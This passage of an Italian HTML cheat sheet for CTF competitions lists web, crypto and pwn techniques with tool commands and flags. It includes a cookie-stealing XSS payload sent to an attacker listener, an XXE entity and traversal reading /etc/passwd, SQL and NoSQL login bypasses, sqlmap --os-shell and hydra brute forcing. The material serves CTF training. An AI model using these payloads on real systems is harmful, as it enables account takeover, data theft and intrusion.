@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Toolkit — Triage & Comandi</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2330; --border:#30363d;
+    --text:#e6edf3; --muted:#8b949e; --accent:#2f81f7; --accent2:#3fb950;
+    --cmd-bg:#0b0f14; --tag:#1f6feb33; --tag-text:#79c0ff; --warn:#d29922; --concept:#a371f7;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  header{position:sticky;top:0;z-index:20;background:linear-gradient(180deg,#0d1117 72%,#0d111700);padding:14px 18px 10px;border-bottom:1px solid var(--border)}
+  .title{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+  .title h1{font-size:18px;margin:0}
+  .title .sub{color:var(--muted);font-size:12px}
+  .searchrow{display:flex;gap:8px;margin-top:10px}
+  #q{flex:1;background:var(--panel);border:1px solid var(--border);color:var(--text);
+     padding:11px 14px;border-radius:10px;font-size:16px;outline:none}
+  #q:focus{border-color:var(--accent)}
+  #count{color:var(--muted);font-size:12px;white-space:nowrap;align-self:center}
+  .chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+  .chip{background:var(--panel);border:1px solid var(--border);color:var(--muted);
+        padding:5px 11px;border-radius:999px;font-size:12px;cursor:pointer;user-select:none}
+  .chip:hover{border-color:var(--accent)}
+  .chip.active{background:var(--tag);color:var(--tag-text);border-color:var(--accent)}
+  .typefilter{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+  .tf{background:var(--panel);border:1px solid var(--border);color:var(--muted);padding:4px 10px;border-radius:7px;font-size:11.5px;cursor:pointer}
+  .tf.active{color:var(--text);border-color:var(--accent2)}
+  main{padding:16px 18px 80px;max-width:1120px;margin:0 auto}
+  .cat{margin:22px 0 10px;font-size:13px;letter-spacing:.08em;text-transform:uppercase;
+       color:var(--accent2);border-bottom:1px solid var(--border);padding-bottom:6px}
+  .cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(345px,1fr));gap:10px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px 13px}
+  .card.triage{background:var(--panel2);border-left:3px solid var(--warn)}
+  .card.howto{background:var(--panel2);border-left:3px solid var(--concept)}
+  .card h3{margin:0 0 4px;font-size:14px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+  .badge{font-size:9.5px;text-transform:uppercase;letter-spacing:.05em;padding:1px 6px;border-radius:5px;font-weight:600}
+  .badge.t{background:#d2992233;color:var(--warn)}
+  .badge.h{background:#a371f733;color:var(--concept)}
+  .card .desc{color:var(--muted);font-size:12.5px;margin:0 0 8px}
+  .cmdbox{display:flex;align-items:flex-start;gap:8px;background:var(--cmd-bg);
+          border:1px solid var(--border);border-radius:8px;padding:8px 10px;margin-bottom:4px}
+  .cmdbox code{font-family:"SFMono-Regular",Consolas,"Liberation Mono",monospace;
+               font-size:12.5px;white-space:pre-wrap;word-break:break-word;color:#c9d1d9;flex:1}
+  .copy{background:var(--panel);border:1px solid var(--border);color:var(--muted);
+        border-radius:6px;padding:3px 8px;font-size:11px;cursor:pointer;white-space:nowrap}
+  .copy:hover{color:var(--text);border-color:var(--accent)}
+  .copy.ok{color:var(--accent2);border-color:var(--accent2)}
+  .how{font-size:12px;color:#adbac7;margin:6px 0 0;padding-left:10px;border-left:2px solid var(--border)}
+  details.opts{margin-top:8px;background:var(--cmd-bg);border:1px solid var(--border);border-radius:8px;padding:0 10px}
+  details.opts summary{cursor:pointer;color:var(--accent);font-size:12px;padding:7px 0;user-select:none;list-style:none}
+  details.opts summary::-webkit-details-marker{display:none}
+  details.opts summary:before{content:"⚙ ";}
+  details.opts[open] summary{border-bottom:1px solid var(--border);margin-bottom:6px}
+  .opt{display:grid;grid-template-columns:auto 1fr;gap:8px;padding:4px 0;font-size:12px;align-items:start}
+  .opt .of{font-family:"SFMono-Regular",Consolas,monospace;color:var(--accent2);white-space:nowrap}
+  .opt .od{color:#c9d1d9}
+  .opt .oe{display:block;color:var(--muted);font-family:"SFMono-Regular",Consolas,monospace;font-size:11px;margin-top:2px}
+  .tags{margin-top:8px;display:flex;flex-wrap:wrap;gap:5px}
+  .tags span{font-size:10.5px;color:var(--tag-text);background:var(--tag);padding:2px 7px;border-radius:5px}
+  .empty{color:var(--muted);text-align:center;padding:50px 0}
+  .hint{color:var(--muted);font-size:11.5px;margin-top:6px}
+  kbd{background:var(--panel2);border:1px solid var(--border);border-bottom-width:2px;border-radius:4px;padding:1px 5px;font-size:11px}
+  code.inl{background:var(--cmd-bg);padding:1px 5px;border-radius:4px;font-size:12px}
+  a{color:var(--accent)}
+  footer{color:var(--muted);font-size:11.5px;text-align:center;padding:30px 18px;line-height:1.7}
+</style>
+</head>
+<body>
+<header>
+  <div class="title">
+    <h1>⚑ CTF Toolkit</h1>
+    <span class="sub">Triage, comandi, parametri e how-to — offline. Profondità: <code class="inl">./search.sh</code> nei mirror <code class="inl">vendor/</code>.</span>
+  </div>
+  <div class="searchrow">
+    <input id="q" type="text" placeholder="Cerca: padding oracle, ret2libc, pcap, jwt, lfi, heap, nmap, dns exfil…  (premi /)" autocomplete="off" spellcheck="false">
+    <span id="count"></span>
+  </div>
+  <div class="chips" id="chips"></div>
+  <div class="typefilter" id="typefilter">
+    <span class="tf active" data-tf="all">Tutto</span>
+    <span class="tf" data-tf="cmd">🔧 Comandi</span>
+    <span class="tf" data-tf="triage">▸ Triage</span>
+    <span class="tf" data-tf="howto">🧭 Concetti</span>
+    <span class="tf" data-tf="opts">⚙ Con opzioni</span>
+  </div>
+  <div class="hint"><kbd>/</kbd> cerca · <kbd>Esc</kbd> pulisci · <b style="color:var(--warn)">▸ Triage</b> "se vedi X fai Y" · <b style="color:var(--concept)">🧭 Concetti</b> how-to · <b>⚙</b> espandi i parametri di un comando · <b>Copia</b> per il comando.</div>
+</header>
+<main id="main"></main>
+<footer>
+  Base cercabile e spiegata — <b>non</b> esaustiva per definizione. Per i flag completi di un tool: <code class="inl">man tool</code> o <code class="inl">tool --help</code>.<br>
+  Fonte completa nei mirror <code class="inl">vendor/</code>: HackTricks · PayloadsAllTheThings · ctf-wiki · how2heap · crypto-attacks · GTFOBins · writeup OliCyber.<br>
+  Non trovi qualcosa? → <code class="inl">./search.sh "termine"</code>
+</footer>
+
+<script>
+// ===================== DATI =====================
+// type: cmd|triage|howto · cat · cmd · how · op:[{o:flag,d:desc,e:esempio}]
+const DATA = [
+
+/* ============ METODOLOGIA / STRATEGIA ============ */
+{cat:"meta",type:"howto",t:"Cos'è una CTF Jeopardy",d:"Sfide indipendenti divise per categoria; ogni flag vale punti. Le risolvi nell'ordine che vuoi; il punteggio spesso cala man mano che più team risolvono.",tags:["ctf","jeopardy","gara","basics"]},
+{cat:"meta",type:"triage",t:"Primi 10 minuti",d:"Leggi regole (limiti IA), formato del flag, come si sottomette. Apri tutte le sfide, scarica gli allegati, tagga facili/medie/rognose.",tags:["gara","strategia","triage"]},
+{cat:"meta",type:"triage",t:"Assegnazione in squadra",d:"Mai in 4 sullo stesso task. Ognuno su 2 task. Prima i quick-win. Un task fermo da 45 min va passato o messo in pausa.",tags:["team","strategia"]},
+{cat:"meta",type:"howto",t:"Il flag: cos'è e come si riconosce",d:"Stringa segreta tipo CCIT{...} o flag{...} nascosta nella sfida. Appena conosci il formato cerchi SEMPRE quel pattern ovunque.",cmd:"grep -rniE 'CCIT\\{|flag\\{' .",tags:["flag","basics","grep"]},
+{cat:"meta",type:"cmd",t:"Quick-win: flag in chiaro",d:"Prima di tutto: il flag è spesso letteralmente dentro il file.",cmd:"strings -n6 file | grep -iE 'CCIT|flag\\{|\\{.*\\}'",tags:["quickwin","strings"]},
+{cat:"meta",type:"cmd",t:"Dato un file sconosciuto, cosa lancio?",d:"Routine di apertura universale per qualunque allegato misterioso.",cmd:"file f; exiftool f; binwalk f; strings -n8 f | head -50; xxd f | head",how:"In ordine: tipo reale → metadati → contenuti annidati → stringhe → magic bytes. Se è testo strano, porta su CyberChef.",tags:["quickwin","file","workflow","triage"]},
+{cat:"meta",type:"howto",t:"Workflow per ogni sfida",d:"1) categoria 2) apri il triage 3) identifica la tecnica 4) parti da un template 5) bloccato? ./search.sh 6) fermo a 45 min? cambia sfida.",tags:["workflow","metodo"]},
+{cat:"meta",type:"cmd",t:"Cartella di lavoro per sfida",d:"Lavora su copie, in cartella dedicata: binwalk e simili generano molti file.",cmd:"mkdir -p work/nomesfida && cd work/nomesfida",tags:["igiene","organizzazione"]},
+
+/* ============ WEB ============ */
+{cat:"web",type:"howto",t:"Come approcciare una web",d:"Guarda sempre: sorgente HTML (commenti), cookie, header, robots.txt, parametri, e il codice sorgente se fornito. Metà delle web si risolve leggendo con attenzione.",tags:["web","metodo","recon"]},
+{cat:"web",type:"cmd",t:"curl: la navetta del web",d:"Fai e ispezioni richieste HTTP a mano: l'arma più versatile sul web.",cmd:"curl -sSIL https://target/",op:[
+ {o:"-s",d:"silenzioso (niente barra di progresso)"},
+ {o:"-S",d:"ma mostra comunque gli errori"},
+ {o:"-I",d:"solo header (HEAD)",e:"curl -I https://t/"},
+ {o:"-L",d:"segui i redirect"},
+ {o:"-i",d:"includi gli header nella risposta"},
+ {o:"-v",d:"verbose: vedi richiesta e risposta complete"},
+ {o:"-X",d:"metodo HTTP",e:"curl -X PUT https://t/"},
+ {o:"-d",d:"dati POST (implica POST)",e:"curl -d 'u=admin&p=x' https://t/login"},
+ {o:"--data-raw",d:"dati POST senza interpretare @",e:"curl --data-raw '{\"a\":1}' ..."},
+ {o:"-H",d:"header custom",e:"curl -H 'Authorization: Bearer X' https://t/"},
+ {o:"-b",d:"invia cookie",e:"curl -b 'session=abc' https://t/"},
+ {o:"-c",d:"salva i cookie in un file",e:"curl -c jar.txt https://t/"},
+ {o:"-x",d:"usa un proxy (es. Burp)",e:"curl -x http://127.0.0.1:8080 https://t/"},
+ {o:"-k",d:"ignora errori certificato TLS"},
+ {o:"-o / -O",d:"salva su file / col nome remoto",e:"curl -O https://t/file.zip"},
+ {o:"--path-as-is",d:"non normalizzare ../ (utile per traversal)"}
+],tags:["recon","curl","http"]},
+{cat:"web",type:"cmd",t:"Tecnologie usate (whatweb)",d:"Riconosce CMS, framework, linguaggio e server.",cmd:"whatweb -a3 https://target/",op:[
+ {o:"-a",d:"livello di aggressività 1-4 (3 = buono)",e:"whatweb -a3 t"},
+ {o:"-v",d:"output verboso con dettagli"},
+ {o:"--log-json",d:"salva risultati in JSON"}
+],tags:["recon","whatweb","fingerprint"]},
+{cat:"web",type:"cmd",t:"Scanner CMS/vuln (nikto)",d:"Scansione rapida di file pericolosi, misconfig e header mancanti.",cmd:"nikto -h https://target/",op:[
+ {o:"-h",d:"host target",e:"nikto -h https://t/"},
+ {o:"-p",d:"porta",e:"nikto -h t -p 8080"},
+ {o:"-ssl",d:"forza HTTPS"},
+ {o:"-Tuning",d:"tipi di test da eseguire",e:"nikto -h t -Tuning 1234"}
+],tags:["recon","nikto","scanner"]},
+{cat:"web",type:"cmd",t:"Brute directory/file (ffuf)",d:"Trova pagine e file nascosti (admin, backup, .git). FUZZ è il segnaposto.",cmd:"ffuf -u https://target/FUZZ -w vendor/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",op:[
+ {o:"-u",d:"URL con FUZZ dove iniettare",e:"ffuf -u https://t/FUZZ -w w.txt"},
+ {o:"-w",d:"wordlist (anche più, con :KEY)",e:"-w users.txt:U -w pass.txt:P"},
+ {o:"-fc",d:"filtra per status code",e:"-fc 404,403"},
+ {o:"-fs",d:"filtra per dimensione risposta",e:"-fs 0"},
+ {o:"-fw",d:"filtra per numero di parole"},
+ {o:"-mc",d:"mostra solo questi status",e:"-mc 200,301"},
+ {o:"-H",d:"header (per vhost o auth)",e:"-H 'Host: FUZZ.t'"},
+ {o:"-X",d:"metodo HTTP"},
+ {o:"-d",d:"corpo POST con FUZZ",e:"-d 'user=FUZZ'"},
+ {o:"-recursion",d:"ricorsivo nelle cartelle trovate"},
+ {o:"-e",d:"estensioni da provare",e:"-e .php,.bak,.txt"},
+ {o:"-t",d:"thread (velocità)",e:"-t 100"},
+ {o:"-mr",d:"match su regex nel corpo",e:"-mr 'flag'"}
+],tags:["fuzzing","ffuf","dirbrute"]},
+{cat:"web",type:"cmd",t:"Brute directory (gobuster)",d:"Alternativa a ffuf, molto usata per dir/dns/vhost.",cmd:"gobuster dir -u https://target -w wordlist.txt",op:[
+ {o:"dir",d:"modalità directory/file"},
+ {o:"dns",d:"modalità sottodomini",e:"gobuster dns -d t.com -w sub.txt"},
+ {o:"vhost",d:"modalità virtual host"},
+ {o:"-u",d:"URL target"},
+ {o:"-w",d:"wordlist"},
+ {o:"-x",d:"estensioni",e:"-x php,html,txt"},
+ {o:"-t",d:"thread",e:"-t 50"},
+ {o:"-k",d:"ignora TLS"},
+ {o:"-b",d:"blacklist di status code",e:"-b 404,403"}
+],tags:["fuzzing","gobuster","dirbrute"]},
+{cat:"web",type:"cmd",t:"Git esposto → dump sorgente",d:"Un .git/ pubblico permette di ricostruire tutto il codice del sito.",cmd:"curl -s https://target/.git/HEAD && git-dumper https://target/.git/ out/",tags:["git","source-leak"]},
+{cat:"web",type:"triage",t:"Login o query che tocca il DB",d:"SQL injection: classica, blind booleana, time-based. Prova ' OR '1'='1 e payload da vendor/payloads/SQL Injection.",tags:["sqli","login","db"]},
+{cat:"web",type:"cmd",t:"SQLi automatica (sqlmap)",d:"Automatizza rilevamento ed estrazione da un parametro vulnerabile.",cmd:"sqlmap -u 'https://target/?id=1' --batch --dbs",how:"Con login: salva la richiesta da Burp in req.txt e usa -r req.txt.",op:[
+ {o:"-u",d:"URL target"},
+ {o:"-r",d:"usa una richiesta HTTP salvata (con cookie/POST)",e:"sqlmap -r req.txt"},
+ {o:"-p",d:"testa solo questo parametro",e:"-p id"},
+ {o:"--data",d:"dati POST",e:"--data 'user=a&pass=b'"},
+ {o:"--cookie",d:"cookie di sessione"},
+ {o:"--batch",d:"accetta i default (niente domande)"},
+ {o:"--level",d:"profondità test 1-5",e:"--level 5"},
+ {o:"--risk",d:"rischiosità payload 1-3",e:"--risk 3"},
+ {o:"--dbs",d:"elenca i database"},
+ {o:"-D x --tables",d:"tabelle di un DB",e:"-D shop --tables"},
+ {o:"-T x --dump",d:"estrai una tabella",e:"-D shop -T users --dump"},
+ {o:"--os-shell",d:"prova una shell sul server"},
+ {o:"--tamper",d:"script di evasione WAF",e:"--tamper=space2comment"}
+],tags:["sqli","sqlmap"]},
+{cat:"web",type:"triage",t:"DB NoSQL / JSON nei parametri",d:"NoSQL injection (Mongo): {\"$ne\":null} o {\"$gt\":\"\"} per bypassare login.",tags:["nosqli","mongodb"]},
+{cat:"web",type:"triage",t:"Token a tre parti xxx.yyy.zzz",d:"È un JWT. Controlla alg=none, chiave debole (brute con rockyou), confusione RS256/HS256.",tags:["jwt","token","auth"]},
+{cat:"web",type:"cmd",t:"JWT: decodifica",d:"Leggi header e payload senza verificare la firma.",cmd:"python3 -c \"import jwt,sys; print(jwt.decode(sys.argv[1], options={'verify_signature':False}))\" TOKEN",tags:["jwt","decode"]},
+{cat:"web",type:"cmd",t:"JWT: attacchi (jwt_tool)",d:"Strumento completo per testare tutte le debolezze dei JWT.",cmd:"python3 jwt_tool.py TOKEN -C -d rockyou.txt",op:[
+ {o:"-C -d",d:"crack della chiave HS256 con dizionario",e:"jwt_tool.py T -C -d rockyou.txt"},
+ {o:"-X a",d:"attacco alg:none"},
+ {o:"-X k",d:"confusione chiave (key confusion RS/HS)"},
+ {o:"-T",d:"modalità tampering interattiva"},
+ {o:"-S",d:"firma con una chiave nota",e:"-S hs256 -p 'secret'"}
+],tags:["jwt","jwt_tool","crack"]},
+{cat:"web",type:"triage",t:"Input riflesso in un template",d:"SSTI. Test {{7*7}} → se stampa 49 è vulnerabile. Per engine: vedi vendor/payloads/Server Side Template Injection.",tags:["ssti","template","rce"]},
+{cat:"web",type:"triage",t:"L'app fa richieste a URL che fornisci",d:"SSRF: punta a localhost, 127.0.0.1, 169.254.169.254 (metadata cloud). Bypass: 0.0.0.0, [::], decimale dell'IP, redirect.",tags:["ssrf","internal"]},
+{cat:"web",type:"triage",t:"Path/nome file nei parametri",d:"Path traversal / LFI. Prova ../../../etc/passwd e wrapper php://filter per leggere sorgenti.",tags:["lfi","traversal"]},
+{cat:"web",type:"cmd",t:"LFI: leggi sorgente PHP",d:"php://filter restituisce il codice in base64 senza eseguirlo.",cmd:"curl 'https://target/?page=php://filter/convert.base64-encode/resource=index.php'",tags:["lfi","php","source"]},
+{cat:"web",type:"triage",t:"Un bot/admin visita un URL che invii",d:"XSS per rubare il cookie admin o fargli compiere azioni. Catena classica 'admin bot'.",tags:["xss","bot","cookie"]},
+{cat:"web",type:"cmd",t:"XSS: ruba cookie",d:"Payload da iniettare dove l'admin lo vedrà; raccogli su un tuo listener.",cmd:"<script>new Image().src='http://TUO-IP:8000/c='+document.cookie<\/script>",how:"Metti in ascolto 'python3 -m http.server 8000' e leggi il cookie nei log.",tags:["xss","cookie"]},
+{cat:"web",type:"triage",t:"Oggetti/stringhe serializzate",d:"Deserializzazione insicura. PHP (O:...), Python pickle, Java (rO0AB...), .NET. Vedi hacktricks per linguaggio.",tags:["deserialization","pickle","rce"]},
+{cat:"web",type:"triage",t:"Upload di file",d:"Bypass estensione/MIME per webshell: doppia estensione, .phtml/.php5, null byte, magic bytes falsi, .htaccess.",tags:["upload","webshell"]},
+{cat:"web",type:"triage",t:"Input finisce in un comando di sistema",d:"Command injection. Separatori: ; | && || $(...) newline. Payload in vendor/payloads/Command Injection.",tags:["rce","command-injection"]},
+{cat:"web",type:"triage",t:"Parsing XML lato server",d:"XXE: leggi file o SSRF via entità esterne.",cmd:"<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",tags:["xxe","xml"]},
+{cat:"web",type:"triage",t:"Accesso a risorse per ID (?id=123)",d:"IDOR: cambia l'ID per vedere dati altrui. Il bug più semplice e comune.",tags:["idor","access-control"]},
+{cat:"web",type:"triage",t:"Merge di oggetti in Node.js",d:"Prototype pollution: inietti __proto__ per alterare proprietà globali → RCE/bypass.",tags:["prototype-pollution","nodejs"]},
+{cat:"web",type:"triage",t:"Endpoint GraphQL",d:"Abusa l'introspection per mappare lo schema, poi cerca query/mutation sensibili.",cmd:"curl -s https://t/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' -H 'Content-Type: application/json'",tags:["graphql","introspection"]},
+{cat:"web",type:"triage",t:"Stessa azione in doppio cambia stato",d:"Race condition (es. riscatta coupon 2 volte). Usa Burp Turbo Intruder o richieste parallele.",tags:["race-condition"]},
+{cat:"web",type:"triage",t:"Redirect con URL nel parametro",d:"Open redirect: ?next=//evil.com. Da solo vale poco, ma concatena con OAuth/SSRF.",tags:["open-redirect"]},
+{cat:"web",type:"cmd",t:"Crack login form (hydra)",d:"Forza bruta su form o servizi quando la sfida lo richiede.",cmd:"hydra -l admin -P rockyou.txt target http-post-form '/login:user=^USER^&pass=^PASS^:incorrect'",op:[
+ {o:"-l / -L",d:"singolo utente / lista utenti",e:"-L users.txt"},
+ {o:"-p / -P",d:"singola password / dizionario",e:"-P rockyou.txt"},
+ {o:"-s",d:"porta custom",e:"-s 8080"},
+ {o:"-f",d:"fermati al primo successo"},
+ {o:"-t",d:"task paralleli",e:"-t 16"},
+ {o:"http-post-form",d:"modulo: path:corpo:stringa-di-fallimento"},
+ {o:"ssh/ftp/...",d:"altri servizi",e:"hydra -l root -P p.txt ssh://t"}
+],tags:["hydra","bruteforce","login"]},
+{cat:"web",type:"howto",t:"Burp Suite: a cosa serve",d:"Proxy che intercetta e rigioca richieste. Repeater edita una richiesta a mano; Intruder fuzza valori. Indispensabile per il web manuale.",tags:["burp","proxy"]},
+
+/* ============ CRYPTO ============ */
+{cat:"crypto",type:"howto",t:"Come approcciare una crypto",d:"Leggi il sorgente: che primitiva è (RSA, AES, XOR, hash, ECC)? Cosa è noto, cosa controlli? Valori sospetti (e piccolo, nonce ripetuto) gridano l'attacco.",tags:["crypto","metodo"]},
+{cat:"crypto",type:"howto",t:"RSA in 30 secondi",d:"Pubblica=(n,e), n=p·q. c=m^e mod n. Se fattorizzi n o e è debole, recuperi m. Quasi tutte le RSA da CTF sono 'parametri scelti male'.",tags:["rsa","basics"]},
+{cat:"crypto",type:"cmd",t:"RSA: attacchi automatici (RsaCtfTool)",d:"Prova decine di attacchi noti. Prima cosa da lanciare su una RSA.",cmd:"python3 vendor/rsactftool/RsaCtfTool.py --publickey key.pem --uncipher cipher.bin",op:[
+ {o:"--publickey",d:"file chiave pubblica .pem/.pub"},
+ {o:"-n / -e",d:"passa n ed e a mano",e:"-n 123.. -e 65537"},
+ {o:"--uncipher",d:"decifra questo ciphertext"},
+ {o:"--attack",d:"forza un attacco specifico",e:"--attack wiener,hastad"},
+ {o:"--private",d:"ricostruisci la chiave privata"},
+ {o:"--dumpkey",d:"mostra i parametri di una chiave"}
+],tags:["rsa","rsactftool"]},
+{cat:"crypto",type:"cmd",t:"RSA: fattorizza n",d:"Se n è piccolo o ha fattori vicini, sympy lo spacca; altrimenti factordb.",cmd:"python3 -c 'import sympy; print(sympy.factorint(N))'",tags:["rsa","factor","sympy"]},
+{cat:"crypto",type:"triage",t:"RSA: e piccolo (3/5), msg corto",d:"Radice e-esima diretta (se m^e<n) o Håstad (stesso m su più n).",tags:["rsa","hastad"]},
+{cat:"crypto",type:"triage",t:"RSA: d piccolo",d:"Attacco di Wiener (o Boneh-Durfee). RsaCtfTool --attack wiener.",tags:["rsa","wiener"]},
+{cat:"crypto",type:"triage",t:"RSA: stesso n, due e coprimi",d:"Common modulus: combini i cifrati con Bézout e recuperi m senza fattorizzare.",tags:["rsa","common-modulus"]},
+{cat:"crypto",type:"triage",t:"RSA: due chiavi condividono un fattore",d:"GCD(n1,n2)=p: entrambi i moduli crollano.",cmd:"python3 -c 'import math;print(math.gcd(N1,N2))'",tags:["rsa","gcd"]},
+{cat:"crypto",type:"triage",t:"RSA: oracolo di parità/LSB",d:"Se il server rivela l'ultimo bit del plaintext per ciphertext scelti, recuperi m con ricerca binaria.",tags:["rsa","lsb-oracle"]},
+{cat:"crypto",type:"howto",t:"AES: modi e debolezze",d:"AES è sicuro, il MODO no. ECB rivela pattern, CBC è malleabile, CTR/GCM muoiono col nonce ripetuto. In CTF si rompe il modo o un oracolo.",tags:["aes","modes"]},
+{cat:"crypto",type:"triage",t:"ECB: blocchi uguali → cifrato uguale",d:"Byte-at-a-time se puoi anteporre input; cut&paste per forgiare token.",tags:["aes","ecb"]},
+{cat:"crypto",type:"triage",t:"CBC + errore sul padding",d:"Padding oracle: decifri senza chiave usando valido/non-valido. Script in vendor/crypto-attacks/attacks/cbc/padding_oracle.py.",tags:["aes","cbc","padding-oracle"]},
+{cat:"crypto",type:"triage",t:"CBC e puoi modificare il cifrato",d:"Bit flipping: alterando C[i-1] cambi i bit di P[i] (es. role=user→admin).",tags:["cbc","bitflip"]},
+{cat:"crypto",type:"triage",t:"CTR/GCM con nonce riutilizzato",d:"Nonce reuse: XOR dei cifrati = XOR dei plaintext.",tags:["ctr","gcm","nonce-reuse"]},
+{cat:"crypto",type:"cmd",t:"openssl: cifratura/hash da CLI",d:"Coltellino crypto: cifra, decifra, calcola digest, gestisce chiavi.",cmd:"openssl enc -d -aes-256-cbc -in f.enc -out f -k pass",op:[
+ {o:"enc",d:"cifra/decifra simmetrico"},
+ {o:"-d",d:"decifra (default è cifra)"},
+ {o:"-aes-256-cbc",d:"algoritmo e modo"},
+ {o:"-k / -pass",d:"password",e:"-k segreto"},
+ {o:"-base64 / -a",d:"input/output in base64"},
+ {o:"dgst",d:"calcola hash",e:"openssl dgst -sha256 f"},
+ {o:"rsa -text",d:"ispeziona una chiave RSA",e:"openssl rsa -pubin -in k.pem -text"},
+ {o:"s_client",d:"connessione TLS per ispezione",e:"openssl s_client -connect t:443"}
+],tags:["openssl","aes","hash"]},
+{cat:"crypto",type:"cmd",t:"Identifica un hash",d:"Capisci il tipo prima di craccarlo.",cmd:"hashid '<hash>'",tags:["hash","hashid"]},
+{cat:"crypto",type:"cmd",t:"Cracka hash (john)",d:"Dizionario rockyou: il 90% delle password CTF è lì.",cmd:"john --wordlist=rockyou.txt hash.txt",op:[
+ {o:"--wordlist",d:"dizionario da usare",e:"--wordlist=rockyou.txt"},
+ {o:"--format",d:"forza il tipo di hash",e:"--format=raw-md5"},
+ {o:"--rules",d:"applica mangling (variazioni)",e:"--rules=Jumbo"},
+ {o:"--show",d:"mostra le password già trovate"},
+ {o:"--incremental",d:"brute force puro"},
+ {o:"--mask",d:"pattern mirato",e:"--mask='?l?l?l?d?d'"}
+],tags:["hash","john","crack"]},
+{cat:"crypto",type:"cmd",t:"Cracka hash (hashcat, GPU)",d:"Più veloce con la tua RTX. -m è il tipo di hash.",cmd:"hashcat -m 0 -a 0 hash.txt rockyou.txt",op:[
+ {o:"-m",d:"tipo hash (0=MD5,100=SHA1,1800=sha512crypt,22000=WPA)",e:"-m 22000"},
+ {o:"-a",d:"modalità attacco (0=dizionario,3=brute,6=ibrido)",e:"-a 3"},
+ {o:"-r",d:"file di regole",e:"-r rules/best64.rule"},
+ {o:"-O",d:"kernel ottimizzati (più veloce)"},
+ {o:"-w",d:"profilo di carico 1-4",e:"-w 3"},
+ {o:"--show",d:"mostra risultati già trovati"},
+ {o:"?l?u?d?s",d:"maschere per -a 3",e:"-a 3 hash '?l?l?l?l?d?d'"}
+],tags:["hash","hashcat","gpu"]},
+{cat:"crypto",type:"howto",t:"Hash length extension",d:"Se valida con H(secret‖msg) e sai len(secret), appendi dati e ricalcoli il MAC senza segreto.",cmd:"hashpump -s SIG -d DATA -a APPEND -k KEYLEN",tags:["hash","length-extension","hashpump"]},
+{cat:"crypto",type:"cmd",t:"XOR single-byte brute",d:"Cifrario XOR a 1 byte: prova 256 chiavi, tieni l'output col flag.",cmd:"python3 templates/xor_tools.py",tags:["xor","classic"]},
+{cat:"crypto",type:"howto",t:"XOR a chiave ripetuta (Vigenère-XOR)",d:"Trova la lunghezza chiave con distanza di Hamming/indice di coincidenza, poi risolvi ogni colonna come XOR a 1 byte.",tags:["xor","vigenere"]},
+{cat:"crypto",type:"triage",t:"Testo strano / catena di encoding",d:"Non è cifratura, è encoding. CyberChef → 'Magic' riconosce e sbroglia catene.",tags:["encoding","cyberchef"]},
+{cat:"crypto",type:"howto",t:"Riconoscere gli encoding a vista",d:"=/== → base64 · solo A-Z2-7 → base32 · coppie hex → esadecimale · <~...~> → base85 · 0/1 lunghi → binario · numeri → decimale/char.",tags:["encoding","recognize"]},
+{cat:"crypto",type:"howto",t:"Cifrari classici",d:"Caesar/ROT (shift), Vigenère (chiave testo), sostituzione (analisi frequenze), Affine, Playfair, Rail fence. CyberChef e dcode.fr li risolvono.",tags:["classic","caesar","vigenere","substitution"]},
+{cat:"crypto",type:"howto",t:"PRNG prevedibili",d:"LCG: con pochi output ricavi i parametri. Mersenne Twister (Python random): 624 output consecutivi ricostruiscono lo stato.",tags:["prng","mersenne","lcg"]},
+{cat:"crypto",type:"howto",t:"ECC: debolezze da CTF",d:"Curve singolari, invalid curve attack, parametri non standard, log discreto facile (Smart/Pohlig-Hellman). vendor/crypto-attacks/attacks/ecc.",tags:["ecc","elliptic"]},
+{cat:"crypto",type:"cmd",t:"SageMath per crypto pesante",d:"Teoria dei numeri, reticoli (LLL), curve ellittiche: lo strumento per crypto avanzata.",cmd:"sage -c 'print(factor(12345))'",tags:["sage","lattice","math"]},
+
+/* ============ PWN ============ */
+{cat:"pwn",type:"howto",t:"Cos'è il pwn",d:"Eseguibile (spesso con sorgente) + server. Trovi un bug di memoria, dirotti l'esecuzione, ottieni shell o leggi il flag.",tags:["pwn","basics"]},
+{cat:"pwn",type:"cmd",t:"Protezioni del binario (checksec)",d:"RELRO/Canary/NX/PIE: determinano la tecnica. Sempre il primo comando.",cmd:"pwn checksec ./chall",how:"NX → serve ROP (niente shellcode). PIE → serve un leak. Canary → va trapelato. Partial RELRO → GOT sovrascrivibile.",tags:["checksec","recon"]},
+{cat:"pwn",type:"cmd",t:"Trova l'offset (cyclic)",d:"Pattern ciclico: dal valore in RIP ricavi i byte prima del return.",cmd:"pwn cyclic 200    # poi: pwn cyclic -l 0x6161616c",tags:["cyclic","offset","bof"]},
+{cat:"pwn",type:"triage",t:"Input senza limite + funzione 'win'",d:"ret2win: riempi fino al return e mettilo all'indirizzo della funzione che stampa il flag.",tags:["bof","ret2win"]},
+{cat:"pwn",type:"howto",t:"ret2libc (NX, niente win)",d:"Riusi system() della libc con '/bin/sh'. Serve un leak per de-randomizzare la libc, poi un gadget 'pop rdi' per l'argomento.",tags:["ret2libc","rop"]},
+{cat:"pwn",type:"cmd",t:"Gadget ROP (ROPgadget)",d:"Mattoncini che finiscono in ret: componi le chiamate.",cmd:"ROPgadget --binary ./chall --re 'pop rdi'",op:[
+ {o:"--binary",d:"file da analizzare"},
+ {o:"--re",d:"filtra con regex",e:"--re 'pop r.i'"},
+ {o:"--ropchain",d:"prova a costruire una catena execve automatica"},
+ {o:"--string",d:"cerca una stringa",e:"--string '/bin/sh'"},
+ {o:"--only",d:"solo certe istruzioni",e:"--only 'pop|ret'"}
+],tags:["rop","ropgadget"]},
